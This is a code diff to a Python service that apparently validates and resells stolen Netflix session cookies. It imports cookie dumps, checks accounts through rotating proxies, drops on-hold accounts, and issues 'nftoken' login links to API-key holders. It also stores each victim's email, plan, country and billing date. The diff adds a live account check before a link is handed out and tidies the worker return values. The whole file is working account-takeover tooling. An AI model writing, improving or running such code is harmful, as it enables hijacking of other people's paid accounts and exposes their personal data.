@@ -346,33 +346,73 @@ def _pick_random(plan=None, country=None):
     with db() as c: return c.execute(q, args).fetchone()
 
 def generate_link(api_key_id=None, plan=None, country=None, max_attempts=20):
-    attempts = 0; last_err = None; tried = set()
+    attempts = 0
+    last_err = None
+    tried = set()
+
     while attempts < max_attempts:
         row = _pick_random(plan, country)
-        if not row: raise RuntimeError("No healthy cookies match your filters.")
+        if not row:
+            raise RuntimeError("No healthy cookies match your filters.")
+
         cid = row["id"]
         if cid in tried:
             if len(tried) >= pool_stats()["healthy"]:
                 raise RuntimeError(f"Pool exhausted: {last_err}")
             continue
-        tried.add(cid); attempts += 1
+        tried.add(cid)
+        attempts += 1
+
         try:
+            # 1. Fetch token
             token = fetch_token(row["netflix_id"])
+
+            # 2. Verify plan + status live before returning any link
+            info = fetch_account_info(row["netflix_id"], token)
+            status = (info.get("membership_status") or "").upper()
+            actual_plan = (info.get("plan") or "").lower()
+
+            # On-hold / past-due / suspended → delete cookie, retry next
+            if status in ("ON_HOLD", "PAST_DUE", "SUSPENDED"):
+                last_err = f"on hold: {status}"
+                with _lock, db() as c:
+                    c.execute("DELETE FROM cookies WHERE id=?", (cid,))
+                continue
+
+            # Plan mismatch → skip, do not evict
+            if plan and actual_plan and plan.lower() not in actual_plan:
+                last_err = f"plan mismatch (wanted {plan}, got {actual_plan})"
+                continue
+
+            # Build link, refresh metadata
+            old_meta = json.loads(row["meta_json"] or "{}")
+            fresh_meta = {
+                "plan": info.get("plan") or old_meta.get("plan"),
+                "country": info.get("country") or old_meta.get("country"),
+                "email": info.get("email") or old_meta.get("email"),
+                "next_billing": info.get("next_billing") or old_meta.get("next_billing"),
+            }
             url = f"https://www.netflix.com/login?nftoken={token}"
-            meta = json.loads(row["meta_json"]) if row["meta_json"] else {}
             with _lock, db() as c:
-                c.execute("UPDATE cookies SET ok_count=ok_count+1,fail_count=0,last_used=? WHERE id=?",
-                          (time.time(), cid))
-                cur = c.execute("INSERT INTO issued_tokens(cookie_id,api_key_id,token,url,created_at) "
-                                "VALUES(?,?,?,?,?)", (cid, api_key_id, token, url, time.time()))
-                return {"url": url, "cookie_id": cid, "attempts": attempts,
-                        "token_id": cur.lastrowid, "meta": meta}
+                c.execute("UPDATE cookies SET ok_count=ok_count+1, fail_count=0, last_used=?, meta_json=? WHERE id=?",
+                          (time.time(), json.dumps(fresh_meta), cid))
+                cur = c.execute("INSERT INTO issued_tokens(cookie_id,api_key_id,token,url,created_at) VALUES(?,?,?,?,?)",
+                                (cid, api_key_id, token, url, time.time()))
+                return {
+                    "url": url,
+                    "cookie_id": cid,
+                    "attempts": attempts,
+                    "token_id": cur.lastrowid,
+                    "meta": fresh_meta,
+                }
+
         except Exception as e:
             last_err = str(e)
             with _lock, db() as c:
-                c.execute("UPDATE cookies SET fail_count=fail_count+1,last_error=?,last_used=? WHERE id=?",
+                c.execute("UPDATE cookies SET fail_count=fail_count+1, last_error=?, last_used=? WHERE id=?",
                           (last_err[:500], time.time(), cid))
                 c.execute("UPDATE cookies SET deleted=1 WHERE id=? AND fail_count>=?", (cid, MAX_FAILS))
+
     raise RuntimeError(f"Gave up after {attempts} attempts: {last_err}")
 
 def list_cookies(limit=500, include_dead=False):
@@ -445,19 +485,19 @@ def run_checker(proxies_input):
     worker_count = max(2, min((len(proxies) or 4), 8))
 
     def worker(row):
-        if not checker_state["running"]: return ("skip", row["id"], None, None)
+        if not checker_state["running"]: return ("skip", row["id"], None)
         proxy = random.choice(proxies) if proxies else None
         try:
             token = fetch_token(row["netflix_id"], proxy=proxy)
         except Exception as e:
-            return ("fail", row["id"], str(e), None)
+            return ("fail", row["id"], str(e))
         info = fetch_account_info(row["netflix_id"], token, proxy=proxy)
-        return ("ok", row["id"], info, proxy)
+        return ("ok", row["id"], info)
 
     with ThreadPoolExecutor(max_workers=worker_count) as pool:
         futures = [pool.submit(worker, r) for r in rows]
         for idx, fut in enumerate(as_completed(futures), 1):
-            status, cid, data, proxy = fut.result()
+            status, cid, data = fut.result()
             if status == "skip": continue
             if status == "ok":
                 info = data or {}
@@ -516,7 +556,7 @@ def run_importer(texts, proxies_input):
     worker_count = max(2, min((len(proxies) or 4), 8))
 
     def worker(item):
-        if not import_state["running"]: return ("skip", None, None, None)
+        if not import_state["running"]: return ("skip", None, None)
         nid, chunk = item
         proxy = random.choice(proxies) if proxies else None
         try:
@@ -524,18 +564,18 @@ def run_importer(texts, proxies_input):
         except Exception as e:
             err = str(e).lower()
             if any(k in err for k in ("proxy", "timeout", "connect", "ssl")):
-                return ("proxyerr", None, None, None)
-            return ("dead", None, None, None)
+                return ("proxyerr", None, None)
+            return ("dead", None, None)
         info = fetch_account_info(nid, token, proxy=proxy)
         status = (info.get("membership_status") or "").upper()
         if status in ("ON_HOLD", "PAST_DUE", "SUSPENDED"):
-            return ("dead", None, None, None)
-        return ("live", chunk, info, nid)
+            return ("dead", None, None)
+        return ("live", chunk, info)
 
     with ThreadPoolExecutor(max_workers=worker_count) as pool:
         futures = [pool.submit(worker, item) for item in flat]
         for idx, fut in enumerate(as_completed(futures), 1):
-            status, chunk, info, nid = fut.result()
+            status, chunk, info = fut.result()
             if status == "skip": continue
             if status == "proxyerr":
                 import_state["logs"].append(f"[{idx}/{len(flat)}] PROXY ERROR")
